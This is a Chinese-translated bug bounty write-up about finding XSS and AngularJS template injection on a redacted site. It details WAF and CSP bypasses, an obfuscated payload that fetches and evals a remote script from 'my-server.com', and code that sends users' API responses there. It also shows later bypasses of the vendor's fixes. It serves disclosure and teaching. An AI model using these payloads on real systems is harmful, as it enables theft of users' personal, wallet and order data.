<html>
<head>
<title>Stealing your data using XSS</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">使用XSS窃取您的数据</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/stealing-your-data-using-xss-bf7e4a31e6ee?source=collection_archive---------0-----------------------#2020-08-17">https://infosecwriteups.com/stealing-your-data-using-xss-bf7e4a31e6ee?source=collection_archive---------0-----------------------#2020-08-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="f51c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好🐥</p><p id="e58e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这篇文章是关于利用我的锁定时间在一个名字必须在这里<em class="kl">编辑</em>的私有程序下寻找bug。█████'s计划自年以来一直很活跃，直到今年，他们的<strong class="jp ir">名人堂</strong>中列出了专业&amp;负责任的黑客名单。尽管如此，我还是设法找到了多个XSS，并将一个XSS的影响升级为敏感数据窃取。所以让我们开始吧🤙。</p><blockquote class="km kn ko"><p id="ea3b" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">注意:本文旨在帮助新手理解影响升级，并深入了解XSS漏洞。</strong></p></blockquote><figure class="ks kt ku kv gt kw"><div class="bz fp l di"><div class="kx ky l"/></div></figure><h1 id="7247" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">时间线:</h1><h1 id="b1c2" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi">14.04.2020</h1><p id="04fb" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">打开计算机，开始主动和被动发现█████.的域和所有范围内的资产用过很多工具，比如Sublist3r，Amass，findomain，subfinder等等。最后我把所有的输出合并成一个列表。</p><p id="7042" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我不太相信自动化测试和懒惰🙃所以我对列表进行了排序，并对它们都进行了探查。一个接一个地访问了每个域名，并且发现了对我来说可能很有价值的域名。这个游戏还在继续。</p><figure class="ks kt ku kv gt kw"><div class="bz fp l di"><div class="md ky l"/></div></figure><h1 id="c843" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi">17.04.2020</h1><p id="82b6" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">经过2天的手动操作，对于一个域，我使用<a class="ae mc" href="https://github.com/tomnomnom/waybackurls" rel="noopener ugc nofollow" target="_blank"> waybackurls </a>得到了一个很好的端点列表，使用<a class="ae mc" href="https://github.com/s0md3v/Arjun" rel="noopener ugc nofollow" target="_blank"> Arjun </a>找到有效的参数，然后得到了一个漂亮的反射😍。</p><h1 id="9716" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">有效载荷:</h1><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="c3dc" class="mj la iq mf b gy mk ml l mm mn">1"&gt;&lt;div+onload=alert()&gt;XSS-FOREVER&lt;/div&gt;</span></pre><p id="3681" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这之后，我有了更多积极的感觉😃我真的可以找到更多，所以🥱.的游戏还在继续</p><h1 id="a322" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi">18.04.2020</h1><p id="158f" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">第一次报告后的第二天，我很早就醒了，没有吃早饭就打开了机器，更深入地研究这个问题。</p><figure class="ks kt ku kv gt kw"><div class="bz fp l di"><div class="mo ky l"/></div></figure><p id="aa34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这次搜寻中，我发现了█████'s重要子域名<strong class="jp ir"> <em class="kl">的潜在输入。</em>t24】█████<strong class="jp ir">t26】。com  </strong>。<strong class="jp ir"> <em class="kl"> </em> </strong>该域一般指用于登录和认证目的。那一刻，这东西让我的血液里充满了肾上腺素🔥。由于这个提到的域名用于生产环境，这有非常严格的WAF规则，阻止了XSS流行的每一次尝试！</strong></p><h1 id="0ce1" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">再深入说说我是怎么绕过WAF的！</h1><blockquote class="km kn ko"><p id="97e0" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">被屏蔽的内容:<code class="fe mp mq mr mf b">'</code>单引号、<code class="fe mp mq mr mf b">&lt;&gt;</code>标签字符、<code class="fe mp mq mr mf b">`</code>、反勾、<code class="fe mp mq mr mf b">[]</code>方括号以及所有其他XSS关键字，如alert、prompt、console.log等。</p><p id="a4c5" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">所以我有非常有限的白名单字符，即<code class="fe mp mq mr mf b">()</code>圆括号、<code class="fe mp mq mr mf b">“</code>双引号、<code class="fe mp mq mr mf b">{}</code>花括号</p></blockquote><p id="0cc7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反思发生在这个时候:</p><blockquote class="km kn ko"><p id="a4cf" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><code class="fe mp mq mr mf b"><em class="iq">&lt;tag ng-init=“</em></code> █████ <code class="fe mp mq mr mf b"><em class="iq">= { … parameter: ‘reflection’, … }” &gt;</em></code></p></blockquote><p id="9e78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">开始用<code class="fe mp mq mr mf b"><strong class="jp ir">ng-init</strong></code> <strong class="jp ir"> </strong>使用”和<code class="fe mp mq mr mf b"><strong class="jp ir">onload=alert()</strong></code> <strong class="jp ir"> </strong>但是可悲的是这完全被屏蔽了，也就是说<code class="fe mp mq mr mf b">onload=</code>被屏蔽了<code class="fe mp mq mr mf b">alert()</code>也被屏蔽了。由于<code class="fe mp mq mr mf b">&lt;&gt;</code>受到限制，我无法结束这个标签。尝试了每一个事件处理程序，仍然没有人在这里工作！休息一下！🥱</p><blockquote class="ms"><p id="0ba6" class="mt mu iq bd mv mw mx my mz na nb kk dk translated">你需要离开你的工作区休息一下，这样当你回来的时候，你会更有精神，准备好工作—拜伦脉动器</p></blockquote><p id="475b" class="pw-post-body-paragraph jn jo iq jp b jq nd js jt ju ne jw jx jy nf ka kb kc ng ke kf kg nh ki kj kk ij bi translated">回来后，我的眼睛刚刚看到<code class="fe mp mq mr mf b">ng-init</code>，这意味着这是AngularJS应用，这也让我想起了<strong class="jp ir"> XSS使用AngularJS </strong>注射，通常称为<strong class="jp ir">客户端模板注射</strong>。在下一秒钟内谷歌了这个，并登陆到这里:<a class="ae mc" href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs" rel="noopener ugc nofollow" target="_blank"> PortSwigger文章</a>。</p><p id="597d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从基本确认开始:</p><blockquote class="km kn ko"><p id="6411" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><code class="fe mp mq mr mf b"><em class="iq">{{7*7}} =&gt; reflected as =&gt; 49</em></code></p></blockquote><p id="6aa1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">确认后，我尝试与XSS有效载荷:</p><blockquote class="km kn ko"><p id="b6f5" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><code class="fe mp mq mr mf b"><em class="iq">{}.”)));foo(1)//”;</em></code></p></blockquote><p id="4afd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在这个注入点被确认为注入，但是像<code class="fe mp mq mr mf b">alert()</code>等功能被很精确地屏蔽了。在网上寻找安古拉杰XSS媒体的文章、评论、安全研究论文等等。在这方面投入几个小时就能得到有效载荷，但问题是长度或在一部分中完成有效载荷。所以我把有效载荷分成两部分，用了两个不同的注射点。</p><blockquote class="km kn ko"><p id="0c30" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><em class="iq">使用</em>绕过被阻止的JS功能</p><p id="8197" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><code class="fe mp mq mr mf b"><em class="iq">_=prompt,_(1)</em></code></p></blockquote><p id="3daa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最终工作有效载荷:</p><blockquote class="km kn ko"><p id="9eae" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><code class="fe mp mq mr mf b"><em class="iq">{{“a”.constructor.prototype.charAt="".valueOf;$eval("foo()//");}}</em></code></p></blockquote><p id="f032" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在的问题是<code class="fe mp mq mr mf b">$eval()</code>也被阻塞了，我们知道字符串类型的有效负载需要得到<code class="fe mp mq mr mf b">$eval()</code>才能执行。整个有效载荷都在工作，但一切都卡在了<code class="fe mp mq mr mf b">$eval()</code>🤦🏽‍♂️.再次休息了一会儿，阅读Angular的开发文档，以找到任何像<code class="fe mp mq mr mf b">eval()</code>这样的替代功能，并不容易找到。转而阅读AngularJS的安全研究论文，这花费了大量的时间和精力。最终发现AngularJS的一个功能可以做到这一点。</p><blockquote class="km kn ko"><p id="b6cf" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><em class="iq">使用</em>绕过阻塞的角度功能</p><p id="f261" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><code class="fe mp mq mr mf b"><em class="iq">$eval() =&gt; changed to =&gt; $evalAsync()</em></code></p></blockquote><p id="5a00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，现在对于所有被屏蔽的实体，我手里都有旁路，把它们合并起来，形成一个由两部分组成的最终载荷，最终载荷是这样的</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="fafc" class="mj la iq mf b gy mk ml l mm mn">https://important.█████.com/█████/█████?...&amp;param1=value1"+ng-value={{a="a".constructor.prototype;a.charAt="".valueOf}}&amp;param2=value2+ng-val={{$evalAsync("x=(_=prompt,_(1))//")}}</span></pre><p id="2f99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">繁荣🥳🎉！我得到了█████'s第二重要域名的XSS，起草了一份很好的报告并寄出，这是我的时刻。</p><figure class="ks kt ku kv gt kw"><div class="bz fp l di"><div class="ni ky l"/></div></figure><p id="526d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">令人惊讶的是，同一生产领域有许多相似的子域。因此，相同的XSS也存在于所有这些子域名中，我报告了所有这些域名💰💰💰。</p><figure class="ks kt ku kv gt kw"><div class="bz fp l di"><div class="ni ky l"/></div></figure><p id="2af8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有3个易受攻击的端点，跨越4个相似的域。这种情况持续了4-5天，然后我转移到另一个资产去看看。</p><blockquote class="km kn ko"><p id="19c8" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">结论:如果你找到一个有效的注射点，记下什么是允许的，什么是被阻止的？请记住适应应用程序的环境，如果任何特定的东西被阻止，环顾四周，寻找旁路和不同的方式来指定或表示同一件事，使用浏览器的控制台进行试错。不要停下来，用力敲！</p></blockquote></div><div class="ab cl nj nk hu nl" role="separator"><span class="nm bw bk nn no np"/><span class="nm bw bk nn no np"/><span class="nm bw bk nn no"/></div><div class="ij ik il im in"><h1 id="9ccb" class="kz la iq bd lb lc nq le lf lg nr li lj lk ns lm ln lo nt lq lr ls nu lu lv lw bi">27.04.2020</h1><p id="f00a" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">在完成上述的bug查找方法后，我开始研究API的工作方式和所有其他的事情。在测试的时候，我发现<code class="fe mp mq mr mf b">404 — Not Found</code>的情况下非常不寻常的重定向，页面被加载，然后重定向到根端点，即<code class="fe mp mq mr mf b">https://</code> █████ <code class="fe mp mq mr mf b">.com/</code>我也有直觉，🧐.这里有问题</p><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/39327d734cb5e7b9426eede6eca31930.png" data-original-src="https://miro.medium.com/v2/resize:fit:472/format:webp/1*m5QX3SdNAwpYHP9UQ4TuCw.jpeg"/></div></figure><p id="eaf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">读取页面的源代码，因为页面有太多的HTML代码，但甚至在呈现页面之前就被重定向到根端点。把这一页交给<a class="ae mc" href="https://github.com/s0md3v/Arjun" rel="noopener ugc nofollow" target="_blank"> Arjun </a>🏹用于查找任何错误消息或类似信息的隐藏参数。发现一个有效参数，该参数反映在<code class="fe mp mq mr mf b">&lt;script&gt;</code>标签的字符串赋值中，即</p><blockquote class="km kn ko"><p id="7615" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><code class="fe mp mq mr mf b"><em class="iq">var foo = 'reflection'</em></code></p></blockquote><p id="7a9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个反射也只有一个被阻塞的实体，即<code class="fe mp mq mr mf b">“</code>双引号，随机地一些符号没有出现在响应中，否则没有阻塞任何<code class="fe mp mq mr mf b">confirm()</code>或<code class="fe mp mq mr mf b">eval()</code>或任何东西。我惊讶的同时也很惊讶！</p><figure class="ks kt ku kv gt kw"><div class="bz fp l di"><div class="ny ky l"/></div></figure><p id="d264" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我再次确认了基本注射:</p><blockquote class="km kn ko"><p id="d5df" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">有效载荷:<code class="fe mp mq mr mf b">?foo='+alert()+'</code></p><p id="595b" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">体现:<code class="fe mp mq mr mf b">var foo = ''+alert()+''</code>而美丽的警戒出现在█████'s主域，这一刻是意料之外的，简直太神奇了！想象一下！</p></blockquote><p id="ccb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是这一次，我不想只报道<code class="fe mp mq mr mf b">alert(1)</code>🤧。在测试API的时候，我知道API调用只能在█████主域名下进行，不能在子域下进行。所以我想利用这个千载难逢的机会把事情升级。我在谷歌上搜索并阅读了许多报告，其中攻击者展示了XSS的影响升级。阅读这样的东西给了我跳出框框表演的好主意🤔。</p><h1 id="a867" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">想法是:</h1><blockquote class="km kn ko"><p id="69aa" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><em class="iq">让我们调用API，复制它们的响应，并将响应发送到我的个人服务器。听起来很简单，对吗？哈哈，没那么easy🥴！</em></p></blockquote><h1 id="5196" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">🚀尝试0x01:</h1><p id="e556" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">由于我是一个熟悉开发的人，并且在项目开发期间有JavaScript的实际经验，所以很容易在我的脑海中找到逻辑，在代码中也是如此，但是我知道我只有很小的窗口可用，因为一旦页面加载，发生反射的页面将会重定向。同样，我使用了一些快速工作的逻辑，而不是使用AJAX的常规老方法，然后处理他们的响应成功错误和bla bla👽。</p><p id="6ca8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我为实现我的想法而制作的JavaScript片段:</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="498b" class="mj la iq mf b gy mk ml l mm mn">function fe(t) {<br/>    fetch(t).then(t =&gt; t.text()).then(t =&gt; {<br/>        fetch("https://my-server.com/log/?p=" + btoa(t))<br/>    })<br/>}<br/>urls = ["https://█████.com/v1/api/.../...", <br/>        "https://█████.com/v2/api/.../...", <br/>        "https://█████.com/v3/api/.../...",<br/>        ...<br/>], urls.forEach(fe);</span></pre><p id="0b55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我想读两三遍会让你明白这里发生了什么。总之:我提到了一个函数<code class="fe mp mq mr mf b">fe()</code>，它将向<code class="fe mp mq mr mf b">GET</code>请求传递给该函数的参数值，在从服务器获得响应后，用响应体的base64编码值向<code class="fe mp mq mr mf b">my-server.com</code>发出另一个<code class="fe mp mq mr mf b">GET</code>请求。接下来是需要调用的<code class="fe mp mq mr mf b">urls</code>列表，我们希望在完成这个列表后，调用<code class="fe mp mq mr mf b">forEach()</code>，它将隐式地执行我们的循环，而不会显式地提到任何<code class="fe mp mq mr mf b">for()</code>或<code class="fe mp mq mr mf b">while()</code>循环🤖。</p><blockquote class="km kn ko"><p id="b0f6" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">问题</strong>:这段代码对于<code class="fe mp mq mr mf b">GET</code>请求长度容量来说太长了</p></blockquote><p id="8b94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">解决方案</strong>:我在我的服务器上托管了这段JavaScript代码，现在在注入点，我只需要调用这段JavaScript代码。简单？不完全是。因为我只能访问有限的JavaScript上下文，而且CSP也已经实现。</p><h1 id="2761" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">🚀尝试0x02:</h1><p id="a40b" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">我可以访问<code class="fe mp mq mr mf b">eval()</code>，所以让我们使用<code class="fe mp mq mr mf b">eval()</code>添加我们托管的JavaScript。我阅读了很多实现这一点的方法，但是它们都没有要求的那么快，因为发生注入的页面在页面加载后会重定向到根端点。所以我参考了Mozilla 的<a class="ae mc" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/" rel="noopener ugc nofollow" target="_blank"> JavaScript文档。这有助于我使用<code class="fe mp mq mr mf b">async</code>和<code class="fe mp mq mr mf b">await</code>获得<code class="fe mp mq mr mf b">eval()ing</code>我的命令所需的速度，这将获得我的托管脚本并执行它💀。</a></p><p id="7432" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">主注入点的JavaScript代码:</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="b5e7" class="mj la iq mf b gy mk ml l mm mn">!async function() {<br/>    let a = await<br/>    function() {<br/>        fetch('https://my-server.com/log.js').then(t =&gt; t.text()).then(d =&gt; {<br/>            eval(d)<br/>        })<br/>    }()<br/>}();</span></pre><p id="2e57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">总之:我在异步模式下调用了这个函数，在await模式下的函数中又调用了一个函数，这个函数向我上面提到的托管JavaScript发出请求。在得到这个请求的响应后，我又有了<code class="fe mp mq mr mf b">eval()ed</code>我的JavaScript，它解决了上面提到的问题。这个解决方案可以说是绕过CSP规则的证明，CSP规则不允许运行来自不可信来源的脚本。</p><blockquote class="km kn ko"><p id="7f25" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">问题:</strong>在GET请求中写这个似乎会在浏览器端产生错误，不知道为什么？</p></blockquote><p id="bb5a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">解决方案:</strong>我对上述整个代码片段进行了base64编码，并将其提交给<code class="fe mp mq mr mf b">decodeURIComponent()</code>，然后将其传递给<code class="fe mp mq mr mf b">atob()</code>，再传递给<code class="fe mp mq mr mf b">eval()</code>。相当困惑？</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="ff46" class="mj la iq mf b gy mk ml l mm mn">█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'</span></pre><blockquote class="km kn ko"><p id="b267" class="jn jo kl jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">问题:</strong>一切都按预期运行，一切都很完美，但是对于每2/5次尝试，页面重定向甚至会在数据窃取发生之前发生。</p></blockquote><h1 id="fcbe" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">🚀尝试0x03:</h1><p id="2628" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">为了防止重定向的发生，我知道我必须破坏一些东西，这可能会产生JavaScript错误，最终在到达重定向状态之前破坏JavaScript。但在打破这个案例之前，我必须执行所有这些动作，然后我希望有一个明确的突破。</p><p id="7cbc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">经过分析和许多尝试和错误，这是我用来利用数据窃取的最终有效载荷。</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="79e3" class="mj la iq mf b gy mk ml l mm mn">█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'});var foo='{ 1,</span></pre><p id="bbcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个最后的有效载荷，停止重定向+以我希望看到的方式执行事情。🤟这真的很有挑战性，因为这是我第一次在真正的BB项目中处理和解决这样的问题。</p><p id="272e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此时，这个恶意制作的URL可以在用户周围共享和传播，其帐户登录的用户将直接受到影响。将会有零信号数据在后台被窃取。我演示了被动活动，比如调用API并将它们路由到我的服务器并收集它们。对于任何单击此精心制作的URL的登录用户，风险如下:</p><ol class=""><li id="42a0" class="nz oa iq jp b jq jr ju jv jy ob kc oc kg od kk oe of og oh bi translated"><strong class="jp ir">泄露用户资料详情</strong>如:全名、电子邮件、手机号码、帐户创建日期、用户类型、用户标识、ssotoken等等。</li><li id="a5cb" class="nz oa iq jp b jq oi ju oj jy ok kc ol kg om kk oe of og oh bi translated"><strong class="jp ir">泄露用户地址详情</strong>如:所有添加的地址、收件人姓名、addressid、完整地址、手机号码、时间戳。</li><li id="d2b8" class="nz oa iq jp b jq oi ju oj jy ok kc ol kg om kk oe of og oh bi translated"><strong class="jp ir">用户钱包详情</strong>泄露，如:钱包可用余额、ownedGUID、ssoId。</li><li id="ab56" class="nz oa iq jp b jq oi ju oj jy ok kc ol kg om kk oe of og oh bi translated"><strong class="jp ir">订单细节泄露</strong>:订单Id、订购项目、数量、状态以及你在个人资料中看到的基本上每一个订单细节。</li><li id="8205" class="nz oa iq jp b jq oi ju oj jy ok kc ol kg om kk oe of og oh bi translated">除此之外，我还可以被动地列举登录用户的每一个操作，如钱包账单、订单历史记录、频繁充值的手机号码列表等等，所有这些都可以通过在我的服务器上托管的JavaScript代码中添加更多API地址来完成。</li></ol><p id="1307" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还有一点要注意的是，这种攻击不仅限于被动的行为，我可以执行更主动的行为，如转移钱包余额，无需交互就可以下单，以及使用其API调用执行移动充值，删除用户地址，取消订阅，等等。<strong class="jp ir"> <em class="kl">但是我犯了一个错误，没有为这次主动攻击</em> </strong> <em class="kl">提供POC，最终减少了奖励金额</em>。没问题，又学到了一课💪。</p></div><div class="ab cl nj nk hu nl" role="separator"><span class="nm bw bk nn no np"/><span class="nm bw bk nn no np"/><span class="nm bw bk nn no"/></div><div class="ij ik il im in"><h1 id="3696" class="kz la iq bd lb lc nq le lf lg nr li lj lk ns lm ln lo nt lq lr ls nu lu lv lw bi translated">让我们来谈谈修复旁路！</h1><p id="5379" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">在报告完所有问题后，█████开始部署修复程序，并会通知我。对于XSS，█████试图对我提交的有效载荷进行修复。但是我还是绕过了他们3-4次。我觉得这也值得新人分享😀。让我们把它分成3个线程。</p><h2 id="730e" class="mj la iq bd lb on oo dn lf op oq dp lj jy or os ln kc ot ou lr kg ov ow lv ox bi translated">1.第一个XSS:</h2><p id="a55d" class="pw-post-body-paragraph jn jo iq jp b jq lx js jt ju ly jw jx jy lz ka kb kc ma ke kf kg mb ki kj kk ij bi translated">修复了我的第一个报告负载，负载为:</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="78f8" class="mj la iq mf b gy mk ml l mm mn">1"&gt;&lt;div+onload=alert()&gt;XSS-FOREVER&lt;/div&gt;</span></pre><p id="1739" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用以下方法绕过了对此问题的修复:</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="ce68" class="mj la iq mf b gy mk ml l mm mn">1\"&gt;&lt;x+onpointerover=alert`xss-bypass`&gt;CLICK+HERE+FOR+DETAILS+OF+ERROR&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span></pre><p id="f1ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mp mq mr mf b">&lt;div&gt;</code>、<code class="fe mp mq mr mf b">onload</code>、<code class="fe mp mq mr mf b">()</code>上了黑名单。用<code class="fe mp mq mr mf b">&lt;x&gt;</code>、<code class="fe mp mq mr mf b">onpointerover</code>和<code class="fe mp mq mr mf b">alert``</code>旁通。</p><p id="60f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他们又应用了一个修复，但还是绕过了使用Chrome特有的事件处理程序。</p><pre class="ks kt ku kv gt me mf mg mh aw mi bi"><span id="eb22" class="mj la iq mf b gy mk ml l mm mn">1\"&gt;&lt;x+onpointerrawupdate=alert`xss-bypass`&gt;CLICK+HERE+FOR+DETAILS+OF+ERROR&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span></pre><p id="d5b2" class="pw-post-body-paragraph jn jo 